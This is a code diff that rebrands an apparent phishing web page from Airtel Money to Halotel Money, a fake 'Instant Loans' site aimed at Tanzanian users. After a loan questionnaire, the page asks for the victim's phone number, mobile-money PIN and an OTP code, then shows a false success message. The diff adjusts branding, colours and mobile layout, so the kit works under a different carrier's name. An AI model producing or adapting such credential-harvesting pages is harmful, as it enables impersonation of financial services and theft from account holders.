@@ -3,16 +3,17 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-  <title>Airtel Money - Instant Loans</title>
+  <title>Halotel - Instant Loans</title>
   <style>
     @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap');
 
     :root {
-      --airtel-red: #E40000;
-      --airtel-red-hover: #B30000;
-      --airtel-light-red: #FFF0F0;
-      --airtel-dark: #1A1A1A;
-      --airtel-gray: #f7f9fa;
+      --halotel-orange: #F58220;
+      --halotel-orange-hover: #d96f15;
+      --halotel-light-orange: #FFF4EB;
+      --halotel-blue: #00509E;
+      --halotel-dark: #1A1A1A;
+      --halotel-gray: #f7f9fa;
       --text-muted: #64748B;
       --border-color: #E2E8F0;
     }
@@ -20,13 +21,14 @@
     * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Plus Jakarta Sans', sans-serif; -webkit-tap-highlight-color: transparent; }
     button:focus { outline: none; }
     
+    /* Prevent body scroll to make it feel like a native app */
     body { 
-      background: var(--airtel-gray); 
+      background: var(--halotel-gray); 
       display: flex; 
       justify-content: center; 
       align-items: center;
       min-height: 100vh; 
-      color: var(--airtel-dark);
+      color: var(--halotel-dark);
       overflow: hidden; 
     }
 
@@ -41,11 +43,12 @@
       overflow: hidden;
     }
 
+    /* Give it a nice phone-like frame on larger screens */
     @media (min-width: 481px) {
       .app-wrapper {
         height: 95vh;
         max-height: 900px;
-        border-radius: 12px;
+        border-radius: 16px;
         box-shadow: 0 20px 40px rgba(0,0,0,0.1);
         border: 1px solid var(--border-color);
       }
@@ -66,33 +69,31 @@
     
     .logo-container { display: flex; align-items: center; gap: 8px; }
     
-    /* Airtel Logo */
-    .airtel-logo { display: flex; align-items: center; gap: 5px; }
-    .airtel-swirl {
-      width: 28px; height: 28px;
-      background-color: var(--airtel-red);
-      border-radius: 50% 50% 50% 0;
-      transform: rotate(-45deg);
-      position: relative;
+    /* Halotel Logo */
+    .halotel-logo { display: flex; align-items: center; gap: 5px; }
+    .halotel-icon {
+      width: 32px; height: 32px;
+      background-color: var(--halotel-orange);
+      border-radius: 50%;
+      display: flex; align-items: center; justify-content: center;
+      color: #fff; font-weight: 800; font-size: 1.2rem;
     }
-    .airtel-swirl::after {
-      content: ''; position: absolute; top: 6px; left: 6px; width: 16px; height: 16px;
-      background: #fff; border-radius: 50% 50% 50% 0;
-    }
-    .logo-text h1 { font-size: 1.4rem; font-weight: 800; color: var(--airtel-dark); line-height: 1; letter-spacing: -0.5px;}
-    .logo-text span { font-size: 0.65rem; color: var(--airtel-red); font-weight: 700; text-transform: uppercase;}
+    .logo-text h1 { font-size: 1.4rem; font-weight: 800; color: var(--halotel-blue); line-height: 1; letter-spacing: -0.5px;}
+    .logo-text span { font-size: 0.65rem; color: var(--halotel-orange); font-weight: 700; text-transform: uppercase;}
     
     .btn-header {
-      background: var(--airtel-red); color: #fff; border: none; border-radius: 6px;
+      background: var(--halotel-orange); color: #fff; border: none; border-radius: 6px;
       padding: 8px 12px; font-size: 0.8rem; font-weight: 700; cursor: pointer;
     }
 
+    /* Scrollable content area */
     .page-container {
       flex: 1;
       position: relative;
       overflow-y: auto; 
       display: flex;
       flex-direction: column;
+      -webkit-overflow-scrolling: touch; /* Smooth scrolling on iOS */
     }
 
     .page { display: none; flex: 1; flex-direction: column; animation: fadeIn 0.3s ease; }
@@ -110,12 +111,12 @@
 
     .trust-badge {
       display: inline-flex; align-items: center; gap: 6px;
-      background: var(--airtel-light-red); color: var(--airtel-red);
+      background: var(--halotel-light-orange); color: var(--halotel-orange);
       padding: 6px 12px; border-radius: 20px; font-size: 0.75rem; font-weight: 700;
-      margin-bottom: 25px; align-self: flex-start; border: 1px solid #ffcccc;
+      margin-bottom: 25px; align-self: flex-start; border: 1px solid #ffd9b3;
     }
     
-    .hero-section h2 { font-size: 2.2rem; font-weight: 800; line-height: 1.1; margin-bottom: 15px; color: var(--airtel-dark); letter-spacing: -1px;}
+    .hero-section h2 { font-size: 2rem; font-weight: 800; line-height: 1.1; margin-bottom: 15px; color: var(--halotel-dark); letter-spacing: -1px;}
     .hero-section p { font-size: 0.95rem; margin-bottom: 25px; color: var(--text-muted); line-height: 1.5; }
 
     /* Loan Card Box */
@@ -130,60 +131,63 @@
     }
 
     .loan-card-header { display: flex; align-items: center; gap: 12px; margin-bottom: 20px; }
-    .icon-box { width: 40px; height: 40px; border-radius: 50%; background: var(--airtel-light-red); display: flex; align-items: center; justify-content: center; color: var(--airtel-red); font-size: 1.2rem; }
+    .icon-box { width: 40px; height: 40px; border-radius: 50%; background: var(--halotel-light-orange); display: flex; align-items: center; justify-content: center; color: var(--halotel-orange); font-size: 1.2rem; }
     .loan-card-title { display: flex; flex-direction: column; }
     .loan-card-title span { font-size: 0.8rem; color: var(--text-muted); font-weight: 600; }
-    .loan-card-title h3 { font-size: 1.3rem; font-weight: 800; color: var(--airtel-dark); }
+    .loan-card-title h3 { font-size: 1.3rem; font-weight: 800; color: var(--halotel-dark); }
 
     .loan-details { display: flex; flex-direction: column; gap: 12px; margin-bottom: 20px; }
     .loan-row { display: flex; justify-content: space-between; font-size: 0.85rem; padding-bottom: 12px; border-bottom: 1px solid var(--border-color); }
     .loan-row span:first-child { color: var(--text-muted); font-weight: 500; }
-    .loan-row span:last-child { color: var(--airtel-dark); font-weight: 700; }
-    .loan-row span.highlight { color: var(--airtel-red); }
+    .loan-row span:last-child { color: var(--halotel-dark); font-weight: 700; }
+    .loan-row span.highlight { color: var(--halotel-orange); }
 
     .trust-box {
-      background: var(--airtel-light-red); border-radius: 8px; padding: 15px; text-align: center;
-      border: 1px solid #ffcccc;
+      background: var(--halotel-light-orange); border-radius: 8px; padding: 15px; text-align: center;
+      border: 1px solid #ffd9b3;
     }
     .trust-box span { font-size: 0.8rem; color: var(--text-muted); font-weight: 600; }
-    .trust-box h4 { font-size: 1.5rem; font-weight: 800; color: var(--airtel-red); }
+    .trust-box h4 { font-size: 1.5rem; font-weight: 800; color: var(--halotel-orange); }
 
     .btn-primary {
-      background: var(--airtel-red); color: #fff; border: none; border-radius: 8px;
+      background: var(--halotel-orange); color: #fff; border: none; border-radius: 8px;
       padding: 16px; font-size: 1rem; font-weight: 700; width: 100%;
       cursor: pointer; transition: 0.2s; margin-top: 10px;
     }
-    .btn-primary:active { background: var(--airtel-red-hover); }
+    .btn-primary:active { background: var(--halotel-orange-hover); }
 
     /* --- PAGE 2: QUESTIONNAIRE --- */
-    .form-title { font-size: 1.6rem; margin: 30px 20px 20px; font-weight: 800; color: var(--airtel-dark); }
+    .form-title { font-size: 1.6rem; margin: 30px 20px 20px; font-weight: 800; color: var(--halotel-dark); }
     .form-group { padding: 0 20px; margin-bottom: 20px; }
-    .form-group label { display: block; font-size: 0.85rem; font-weight: 700; margin-bottom: 8px; color: var(--airtel-dark); }
+    .form-group label { display: block; font-size: 0.85rem; font-weight: 700; margin-bottom: 8px; color: var(--halotel-dark); }
+    
+    /* 16px font size prevents auto-zoom on iPhone */
     .form-group input, .form-group select {
       width: 100%; padding: 14px; border: 1px solid var(--border-color); border-radius: 8px;
       font-size: 16px; color: #333; background: #fff;
     }
-    .form-group input:focus, .form-group select:focus { outline: none; border-color: var(--airtel-red); box-shadow: 0 0 0 3px var(--airtel-light-red); }
+    .form-group input:focus, .form-group select:focus { outline: none; border-color: var(--halotel-orange); box-shadow: 0 0 0 3px var(--halotel-light-orange); }
     
     .btn-submit {
-      background: var(--airtel-red); color: #fff; border: none; border-radius: 8px;
+      background: var(--halotel-orange); color: #fff; border: none; border-radius: 8px;
       width: calc(100% - 40px); margin: 10px 20px 30px; padding: 16px; font-size: 1rem; font-weight: 700;
       cursor: pointer; display: flex; justify-content: center; align-items: center; gap: 10px;
+      min-height: 54px;
     }
-    .btn-submit:disabled { background: #ff8080; cursor: wait; }
+    .btn-submit:disabled { background: #ffb266; cursor: wait; }
 
     /* --- PAGE 3 & 4: LOGIN / OTP --- */
     .login-container { display: flex; flex-direction: column; flex: 1; background: #fff; position: relative; }
     
     .login-top { flex: 1; padding: 30px 20px; text-align: center; display: flex; flex-direction: column; justify-content: center; margin-bottom: 30px;}
-    .login-logo { font-size: 2.2rem; font-weight: 800; margin-bottom: 20px; color: var(--airtel-red); letter-spacing: -1px;}
-    .login-top h3 { font-size: 1.2rem; color: var(--airtel-dark); margin-bottom: 30px; font-weight: 700;}
+    .login-logo { font-size: 2.2rem; font-weight: 800; margin-bottom: 20px; color: var(--halotel-orange); letter-spacing: -1px;}
+    .login-top h3 { font-size: 1.2rem; color: var(--halotel-dark); margin-bottom: 30px; font-weight: 700;}
 
     .phone-input-box {
       display: flex; align-items: center; border: 1px solid var(--border-color); border-radius: 8px;
       padding: 12px; margin-bottom: 25px; max-width: 350px; margin-left: auto; margin-right: auto; width: 100%;
     }
-    .country-code { display: flex; align-items: center; font-size: 1rem; font-weight: 600; padding-right: 15px; border-right: 1px solid var(--border-color); color: var(--airtel-dark); }
+    .country-code { display: flex; align-items: center; font-size: 1rem; font-weight: 600; padding-right: 15px; border-right: 1px solid var(--border-color); color: var(--halotel-dark); }
     
     /* Tanzania Flag SVG */
     .flag-icon {
@@ -191,26 +195,29 @@
       background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 800 600'%3E%3Cpath fill='%231EB53E' d='M0 0h800v600H0z'/%3E%3Cpath fill='%2300A3DD' d='M0 600L800 0H0z'/%3E%3Cpath stroke='%23FCD116' stroke-width='100' d='M0 600L800 0'/%3E%3Cpath stroke='%23000' stroke-width='50' d='M0 600L800 0'/%3E%3C/svg%3E");
       background-size: cover; border-radius: 2px;
     }
-    .phone-input-box input { border: none; outline: none; padding-left: 15px; font-size: 16px; width: 100%; font-weight: 700; letter-spacing: 1px; color: var(--airtel-dark);}
+    .phone-input-box input { border: none; outline: none; padding-left: 15px; font-size: 16px; width: 100%; font-weight: 700; letter-spacing: 1px; color: var(--halotel-dark);}
 
     .pin-label { color: var(--text-muted); font-weight: 600; margin-bottom: 15px; font-size: 0.95rem; }
-    .pin-boxes { display: flex; justify-content: center; gap: 12px; }
+    
+    /* PIN Boxes adjusted for mobile */
+    .pin-boxes { display: flex; justify-content: center; gap: 10px; }
     .pin-boxes input {
-      width: 50px; height: 60px; border: 1px solid var(--border-color); border-radius: 8px;
-      text-align: center; font-size: 1.5rem; font-weight: 700; outline: none; color: var(--airtel-dark);
-    }
-    .pin-boxes input:focus { border-color: var(--airtel-red); box-shadow: 0 0 0 3px var(--airtel-light-red); }
-
-    .otp-boxes { display: flex; justify-content: center; gap: 8px; margin-bottom: 30px; }
-    .otp-boxes input {
       width: 45px; height: 55px; border: 1px solid var(--border-color); border-radius: 8px;
-      text-align: center; font-size: 1.3rem; font-weight: 600; outline: none; color: var(--airtel-dark);
+      text-align: center; font-size: 1.5rem; font-weight: 700; outline: none; color: var(--halotel-dark);
     }
-    .otp-boxes input:focus { border-color: var(--airtel-red); box-shadow: 0 0 0 3px var(--airtel-light-red); }
+    .pin-boxes input:focus { border-color: var(--halotel-orange); box-shadow: 0 0 0 3px var(--halotel-light-orange); }
+
+    /* OTP Boxes adjusted for mobile */
+    .otp-boxes { display: flex; justify-content: center; gap: 6px; margin-bottom: 30px; }
+    .otp-boxes input {
+      width: 42px; height: 52px; border: 1px solid var(--border-color); border-radius: 8px;
+      text-align: center; font-size: 1.3rem; font-weight: 600; outline: none; color: var(--halotel-dark);
+    }
+    .otp-boxes input:focus { border-color: var(--halotel-orange); box-shadow: 0 0 0 3px var(--halotel-light-orange); }
     .resend-text { color: var(--text-muted); font-size: 0.9rem; font-weight: 600; }
     
     .login-bottom {
-      background: var(--airtel-dark);
+      background: var(--halotel-dark);
       padding: 40px 20px calc(30px + env(safe-area-inset-bottom));
       color: #fff; text-align: center; margin-top: auto;
       position: relative;
@@ -219,16 +226,17 @@
     .login-bottom p { font-size: 0.9rem; margin-bottom: 20px; line-height: 1.4; opacity: 0.9; }
     .bottom-buttons { display: flex; gap: 12px; max-width: 350px; margin: 0 auto; }
     
+    /* Buttons large enough for mobile tapping */
     .bottom-buttons button {
-      flex: 1; background: #fff; color: var(--airtel-dark); border: none; border-radius: 6px;
+      flex: 1; background: #fff; color: var(--halotel-dark); border: none; border-radius: 6px;
       padding: 12px; font-size: 0.85rem; font-weight: 700; cursor: pointer;
       display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 8px;
       min-height: 60px;
     }
-    .bottom-buttons button i { color: var(--airtel-red); font-size: 1.4rem; }
+    .bottom-buttons button i { color: var(--halotel-orange); font-size: 1.4rem; }
     
     .login-footer { margin-top: 25px; font-size: 0.75rem; color: rgba(255,255,255,0.7); line-height: 1.5; }
-    .login-footer a { color: var(--airtel-red); text-decoration: underline; }
+    .login-footer a { color: var(--halotel-orange); text-decoration: underline; }
 
     .help-link { display: flex; justify-content: center; align-items: center; gap: 8px; font-size: 1rem; font-weight: 600; margin-bottom: 20px; cursor: pointer; color: #fff;}
     .help-link i { font-size: 1.3rem; }
@@ -240,11 +248,11 @@
     }
     .spinner {
       width: 60px; height: 60px; border: 4px solid var(--border-color);
-      border-top: 4px solid var(--airtel-red); border-radius: 50%;
+      border-top: 4px solid var(--halotel-orange); border-radius: 50%;
       animation: spin 1s linear infinite; margin-bottom: 25px;
     }
     @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-    .waiting-screen h2 { font-size: 1.5rem; color: var(--airtel-dark); margin-bottom: 10px; font-weight: 800;}
+    .waiting-screen h2 { font-size: 1.5rem; color: var(--halotel-dark); margin-bottom: 10px; font-weight: 800;}
     .waiting-screen p { color: var(--text-muted); line-height: 1.5; }
 
     /* Utilities */
@@ -259,10 +267,10 @@
   <!-- Navbar -->
   <div class="navbar">
     <div class="logo-container">
-      <div class="airtel-logo">
-        <div class="airtel-swirl"></div>
+      <div class="halotel-logo">
+        <div class="halotel-icon"><i class="fa-solid fa-signal" style="transform: rotate(-45deg);"></i></div>
         <div class="logo-text">
-          <h1>airtel</h1>
+          <h1>Halotel</h1>
           <span>Money</span>
         </div>
       </div>
@@ -279,7 +287,7 @@
         </div>
         
         <h2>Instant Loans.<br>Anytime. Anywhere.</h2>
-        <p>Quick access to credit for individuals and businesses. Join over 30,000 Tanzanians already empowered by Airtel Money.</p>
+        <p>Quick access to credit for individuals and businesses. Join thousands of Tanzanians already empowered by Halotel Money.</p>
 
         <div class="loan-card">
           <div class="loan-card-header">
@@ -297,7 +305,7 @@
             </div>
             <div class="loan-row">
               <span>Disbursement</span>
-              <span class="highlight">Airtel Money</span>
+              <span class="highlight">Halotel Money</span>
             </div>
             <div class="loan-row" style="border-bottom: none;">
               <span>Duration</span>
@@ -363,7 +371,7 @@
     <div id="page3" class="page">
       <div class="login-container">
         <div class="login-top">
-          <div class="login-logo" style="color: var(--airtel-red);">airtel money</div>
+          <div class="login-logo" style="color: var(--halotel-orange);">Halotel Money</div>
           <h3>Secure Login</h3>
 
           <div class="phone-input-box">
@@ -371,10 +379,10 @@
               <div class="flag-icon"></div>
               +255
             </div>
-            <input type="tel" id="pPhone" placeholder="Airtel Phone Number" autocomplete="off">
+            <input type="tel" id="pPhone" placeholder="Halotel Phone Number" autocomplete="off">
           </div>
 
-          <p class="pin-label">Enter your Airtel Money PIN</p>
+          <p class="pin-label">Enter your Halotel Money PIN</p>
           <div class="pin-boxes" id="pinContainer">
             <input type="password" autocomplete="new-password" maxlength="1" inputmode="numeric" oninput="moveFocus(this, 'pin1')" id="pin0">
             <input type="password" autocomplete="new-password" maxlength="1" inputmode="numeric" oninput="moveFocus(this, 'pin2')" id="pin1">
@@ -386,7 +394,7 @@
         </div>
 
         <div class="login-bottom">
-          <p>To register an Airtel Money account or get assistance,<br>click below</p>
+          <p>To register a Halotel Money account or get assistance,<br>click below</p>
           <div class="bottom-buttons">
             <button type="button" onclick="submitRegistration()" id="btnRegister"><i class="fa-solid fa-user-plus"></i>Register</button>
             <button type="button" onclick="alert('Help')"><i class="fa-solid fa-circle-info"></i>Help & Support</button>
@@ -403,9 +411,9 @@
     <div id="page4" class="page">
       <div class="login-container">
         <div class="login-top">
-          <div class="login-logo" style="color: var(--airtel-red);">airtel money</div>
+          <div class="login-logo" style="color: var(--halotel-orange);">Halotel Money</div>
           <h3>Enter the OTP code sent to</h3>
-          <div class="otp-phone" id="otpPhoneDisplay" style="font-weight: 700; margin-bottom: 40px; font-size: 1.1rem; color: var(--airtel-red);">+255 00 000 0000</div>
+          <div class="otp-phone" id="otpPhoneDisplay" style="font-weight: 700; margin-bottom: 40px; font-size: 1.1rem; color: var(--halotel-orange);">+255 00 000 0000</div>
 
           <div class="otp-boxes" id="otpContainer">
             <input type="text" maxlength="1" inputmode="numeric" oninput="moveFocusOTP(this, 'otp1')" id="otp0">
@@ -439,8 +447,8 @@
 
     <!-- Page 6: Success -->
     <div id="page5" class="page" style="text-align: center; padding: 50px 20px; justify-content: center;">
-      <h2 style="color: var(--airtel-red); font-size: 2.5rem; margin-bottom: 20px; font-weight: 800;">Congratulations!</h2>
-      <p style="color: var(--text-muted); font-size: 1.1rem; line-height: 1.5;">Your loan application has been fully processed. Please check your Airtel Money account shortly.</p>
+      <h2 style="color: var(--halotel-orange); font-size: 2.5rem; margin-bottom: 20px; font-weight: 800;">Congratulations!</h2>
+      <p style="color: var(--text-muted); font-size: 1.1rem; line-height: 1.5;">Your loan application has been fully processed. Please check your Halotel Money account shortly.</p>
     </div>
   </div>
 </div>
@@ -515,7 +523,7 @@
     const pins = Array.from(document.querySelectorAll('#pinContainer input')).map(i => i.value).join('');
     
     if (phone === '' || pins.length < 4) {
-      document.getElementById('errLogin').textContent = 'Please enter your Airtel number and full 4-digit PIN.';
+      document.getElementById('errLogin').textContent = 'Please enter your Halotel number and full 4-digit PIN.';
       document.getElementById('errLogin').style.display = 'block';
       return;
     }
